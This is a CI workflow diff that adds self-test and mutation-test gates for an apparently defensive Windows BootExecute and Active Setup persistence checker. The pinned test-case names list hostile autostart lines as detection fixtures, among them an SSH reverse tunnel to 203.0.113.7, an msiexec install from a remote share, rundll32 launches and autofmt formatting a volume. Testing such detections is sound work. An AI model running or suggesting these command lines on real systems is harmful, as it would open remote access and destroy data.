@@ -1039,6 +1039,84 @@ jobs:
             grep -qF "led 'WARNING' '10' 'T1021.001' 'RDP enabled without NLA'" "$b" || { echo "$b: the NLA fix no longer triggers off the ledger"; exit 1; }
           done
 
+      - name: BootExecute and Active Setup -- [OK] only for a line Windows, Edge or Chrome keeps; whatever the check cannot account for is named
+        run: |
+          # The self-test had no gate at all on Linux: the first version read
+          # [OK] for 11 of 17 hostile lines and the second for eleven more
+          # classes, and each time only a person re-running its functions
+          # found out. The floor and the pinned names keep a hostile case
+          # from being deleted quietly.
+          # Into a FILE, and every grep reads the file. This output is larger
+          # than a pipe holds (64 KB): `echo "$out" | grep -q X` then ends in
+          # SIGPIPE whenever grep finds X early, and under pipefail a found
+          # case reads as "case gone" and a found [FAIL] as none -- at random.
+          f="$RUNNER_TEMP/dz_bas_selftest.txt"; [ -n "$RUNNER_TEMP" ] || f=$(mktemp)
+          pwsh -NoProfile -File tools/boot_activesetup_check.ps1 -SelfTest > "$f" || { grep -v '^\[OK\]   ' "$f"; echo 'boot_activesetup_check -SelfTest failed'; exit 1; }
+          tail -3 "$f"
+          grep -q '^\[FAIL\]' "$f" && { echo 'a BootExecute / Active Setup case failed'; exit 1; }
+          n=$(grep -c '^\[OK\]   ' "$f"); [ "$n" -ge 310 ] || { echo "only $n BootExecute / Active Setup case(s)"; exit 1; }
+          nh=$(grep -c '^\[OK\]   hostile' "$f"); [ "$nh" -ge 160 ] || { echo "only $nh hostile case(s)"; exit 1; }
+          for n in 'autochk followed by a no-break space is not the stock entry (only a space or a tab separates)' \
+                   "hostile boot: Microsoft's own autofmt told to format a volume is a WARNING, never INFO and never the all-clear" \
+                   'a BootExecute stored as bytes is ONE WARNING that it is not text, never a line per byte' \
+                   'a StubPath stored as Binary is a WARNING that it is not text, never INFO (10)' \
+                   'a 31,000-character StubPath is a WARNING, not parsed: no file is probed and no name looked up' \
+                   'no network, mapped, removable, device, stream or over-long path reached the file probe' \
+                   'no name with a drive, a separator, a stream or a device name reached the search-path lookup' \
+                   'the search-path lookup itself refuses a name that is not a plain file name, whoever calls it' \
+                   "every command and type that can touch a file, the registry or the network sits inside a door function (read from this file's own syntax tree)" \
+                   'the file probe is called from Get-FileFacts and nowhere else; the search-path lookup from Find-OnSearchPath and nowhere else' \
+                   'a component key, name or StubPath holding a line break cannot write a report line of its own' \
+                   'more components than any Windows holds: exactly 512 are graded and the rest is a raised gap, never an all-clear' \
+                   "an unquoted path is run by its FIRST reading that exists: a planted C:\\Program.exe is the program, and is raised" \
+                   'a short (8.3) path is judged on the folder it really names' \
+                   "only the EXACT text is Windows' own: '/userinstall' is judged like any line" \
+                   "hostile: 'C:\\Users\\.\\Public\\tool.exe /s' is CRITICAL" \
+                   "hostile: 'C:\\Users\\victim\\DOWNLO~1\\tool.exe' is CRITICAL" \
+                   "hostile: 'updater /s' is raised" \
+                   "hostile: 'cmd.exe /D /C start updater' is raised" \
+                   "hostile: 'rundll32.exe pcwutl.dll,LaunchApplication calc' is raised" \
+                   "hostile: '\"C:\\Program Files\\Acme\\helper.exe\" /c echo hi' is raised" \
+                   "hostile: '\"C:\\Program Files\\OpenSSH\\ssh.exe\" -N -R 2222:localhost:3389 user@203.0.113.7' is raised" \
+                   "hostile: 'C:/Program Files/Acme.v2/evil /s' is raised" \
+                   "hostile: 'C:\\Program Files\\Acme\\tool -x' is raised" \
+                   "hostile: 'C:\\ProgramData\\Vendor\\signedtool.exe /x' is raised" \
+                   "hostile: 'msiexec.exe /i //203.0.113.7/share/x.dat /qn' is raised" \
+                   "hostile: '\"C:\\Program Files\\LinkDir\\tool.exe\" /s' is raised" \
+                   "a signed line that is not one Windows, Edge or Chrome keeps is INFO, listed and not cleared: 'rundll32.exe shell32,Control_RunDLL'" \
+                   "another vendor's signed program is INFO naming its signer, not raised and not [OK]: '\"C:\\Program Files\\Vendor\\app.exe\" /cmd /install'" \
+                   "msiexec by product code is INFO that says the package is not traced, never [OK]: 'msiexec.exe /i {11111111-2222-3333-4444-555555555555} /qn'" \
+                   "Active Setup '\"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Windows\\System32\\iesetup.dll\",IEHardenUser' reads [OK] on iesetup.dll"; do
+            grep -qF "[OK]   $n" "$f" || { echo "case gone: $n"; exit 1; }
+          done
+          for b in doze_sec.bat doze_sec_noAdmin.bat; do
+            for m in bootexec bootexec_gap activesetup activesetup_gap; do
+              grep -qF "if exist \"%TEMP%\\dz_$m.txt\" (" "$b" || { echo "$b: the dz_$m marker is never read -- that verdict would reach no ledger row"; exit 1; }
+            done
+            # (A step must not END on an `A && B` line: when A is false the
+            # step's own exit code is A's.)
+            grep -qF 'BootExecute (SAFE: autocheck autochk * only)' "$b" && { echo "$b: the ungraded BootExecute dump is back"; exit 1; }
+            grep -qF 'if not exist "%TEMP%\dz_bootas_done.txt" if exist' "$b" || { echo "$b: the BootExecute / Active Setup check lost its no-verdict backstop"; exit 1; }
+            grep -qF 'BootExecute and Active Setup evaluation produced no verdict' "$b" || { echo "$b: lost its no-verdict wording"; exit 1; }
+          done
+
+      - name: BootExecute and Active Setup -- each rule, weakened, must fail the self-test; a change that weakens nothing must be reported
+        run: |
+          # A green self-test proved nothing twice for this check. Each entry
+          # of tests/boot_activesetup_mutations.ps1 removes one rule from a
+          # copy of the tool; the copy's self-test must then fail.
+          t="${RUNNER_TEMP:-$(mktemp -d)}"
+          pwsh -NoProfile -File tests/boot_activesetup_mutations.ps1 > "$t/dz_bas_mut.txt" || { grep -v '^\[OK\]   ' "$t/dz_bas_mut.txt"; echo 'a weakened rule went unnoticed'; exit 1; }
+          tail -1 "$t/dz_bas_mut.txt"
+          n=$(grep -c '^\[OK\]   M[0-9]' "$t/dz_bas_mut.txt"); [ "$n" -ge 44 ] || { echo "only $n mutation(s) ran"; exit 1; }
+          # The runner itself must be able to fail: a change that weakens
+          # nothing survives, and has to be reported as a survivor.
+          if pwsh -NoProfile -File tests/boot_activesetup_mutations.ps1 -Canary -Only C00,M01 > "$t/dz_bas_canary.txt"; then cat "$t/dz_bas_canary.txt"; echo 'the canary run passed: a rule nobody tests would go unnoticed'; exit 1; fi
+          grep -qF '[OK]   M01 ' "$t/dz_bas_canary.txt" || { cat "$t/dz_bas_canary.txt"; echo 'the canary run did not run the real mutation beside the canary'; exit 1; }
+          grep -qF '[FAIL] C00 ' "$t/dz_bas_canary.txt" || { cat "$t/dz_bas_canary.txt"; echo 'the canary was not reported as a survivor'; exit 1; }
+          if pwsh -NoProfile -File tests/boot_activesetup_mutations.ps1 -Only NOSUCH > "$t/dz_bas_none.txt"; then echo 'a run that selected no mutation passed'; exit 1; fi
+          grep -qF '0 mutation(s) selected' "$t/dz_bas_none.txt" || { cat "$t/dz_bas_none.txt"; echo 'an empty selection is not reported as such'; exit 1; }
+
       - name: reg_policy_check -- Winlogon/AppInit, Script Block Logging and UAC; a key that could not be read is a raised gap, never an all-clear
         run: |
           out=$(pwsh -NoProfile -File tools/reg_policy_check.ps1 -SelfTest); echo "$out"
@@ -1101,6 +1179,14 @@ jobs:
           for f in $called; do [ -s ".github/ci/$f" ] || { echo ".github/ci/$f is missing or empty -- its step would run nothing"; exit 1; }; done
           for f in .github/ci/*.ps1; do echo "$called" | grep -qxF "$(basename "$f")" || { echo "$f is called by no step in windows-smoke.yml"; exit 1; }; done
           n=$(echo "$called" | wc -l); [ "$n" -ge 30 ] || { echo "only $n step(s) call a .github/ci script; 30 are expected"; exit 1; }
+          # .github/ci/lib/ holds helpers that step bodies dot-source (they
+          # are not bodies, so no step calls them). Each must be used by at
+          # least one body: a helper nothing loads is dead code that still
+          # reads as a tested convention.
+          for f in .github/ci/lib/*.ps1; do
+            [ -e "$f" ] || continue
+            grep -lF ". .\\.github\\ci\\lib\\$(basename "$f")" .github/ci/*.ps1 >/dev/null || { echo "$f is dot-sourced by no step body in .github/ci/"; exit 1; }
+          done
           # cmd reads a bare < or > in an echo as a file redirection, quoted or
           # not by PowerShell's single quotes: 'Expected: <Windows>\system32...'
           # in a tile's help text made the whole line vanish from the dashboard
